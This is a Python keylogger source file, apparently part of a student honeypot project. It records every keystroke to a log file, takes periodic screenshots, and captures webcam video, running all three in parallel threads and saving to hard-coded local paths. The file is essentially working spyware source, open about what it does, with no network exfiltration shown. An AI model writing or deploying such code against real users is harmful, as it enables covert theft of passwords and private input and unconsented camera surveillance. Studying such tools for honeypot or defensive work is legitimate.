#Import all these Libraries
from mss import mss                     #To take screenshots
from pynput.keyboard import Listener    #To keep record of pressed Keys
from threading import Timer,Thread      #To run thing in parallel(screenshots and keylogs)
import time                             #To record time of Screenshots
import os                               #To make the System to intract with the Operating System
import cv2

count=0
keys=[]                                 #List which all the pressed keys


                                        
class IntervalTimer(Timer):             #Control the Time interval between each Screenshots
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)
            
def CaptureVideo():
    vid_capture = cv2.VideoCapture(0)
    vid_cod = cv2.VideoWriter_fourcc(*'XVID')
    output = cv2.VideoWriter("D:\winter semester 2022-23\CSE3502\Project\Honeypot-Implementation-master\captured-video.mp4", vid_cod, 20.0, (640,480))

    for i in range(200) :
        ret,frame = vid_capture.read()
        #  cv2.imshow("My cam video", frame)
        output.write(frame)
        #  close the video after 5 sec
        if cv2.waitKey(1) &0XFF == ord('x'):
            break

    vid_capture.release()
    output.release()

def write_file(keys):                  #To write the keys to the Files
    with open("D:\\winter semester 2022-23\\CSE3502\\Project\\Honeypot-Implementation-master\\Keylogger\\log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space")>0:      #Replace Key_Space with " " in the main file
                f.write(" ")
            if k.find("enter")>0:      #Replace Key_Enter with "\n or nextline"
                f.write("\n")
            elif k.find("Key") == -1:   
                f.write(k)
                  

class keylogger_main:
    
    def _build_logs(self):             #To create the directory which contains all the screenshots and log files 
        if not os.path.exists('D:\\winter semester 2022-23\\CSE3502\\Project\\Honeypot-Implementation-master\\Keylogger'):
            os.mkdir('D:/winter semester 2022-23/CSE3502/Project/Honeypot-Implementation-master/Keylogger')
            os.mkdir('D:/winter semester 2022-23/CSE3502/Project/Honeypot-Implementation-master/Keylogger/Screenshots')
        if not os.path.exists('D:\\winter semester 2022-23\\CSE3502\\Project\\Honeypot-Implementation-master\\Keylogger\\log.txt'):
            with open('D:\\winter semester 2022-23\\CSE3502\\Project\\Honeypot-Implementation-master\\Keylogger\\log.txt','w') as f:
                f.write("Keylogger Started\n")

    
    def _on_press(self,k):             #This Function keeps track of pressed keys
        global keys, count
        # //print("{0} pressed".format(k))
        keys.append(k)
        count+=1
    
        if count >=10:
            count=0
            write_file(keys)
            keys=[]   
    
    def _keylogger(self):            #Main Funciton to start the key tracker
        with Listener(on_press=self._on_press) as listener:
            listener.join()
            
    def _Screenshot(self):           #Main Function to start thr Screenshot tracker
        sct=mss()
        sct.shot(output='D:\\winter semester 2022-23\\CSE3502\\Project\\Honeypot-Implementation-master\\Keylogger\\Screenshots/{}.png'.format(time.time()))
    
    def run(self,interval):        #Main fucntion to start the keylogger
        
        self._build_logs()
        Thread(target=self._keylogger).start()   #This thread function is used to Run the Keys and Screenshots tracker parallely
        Thread(target=CaptureVideo).start()
        IntervalTimer(interval, self._Screenshot).start()
        
        
km=keylogger_main()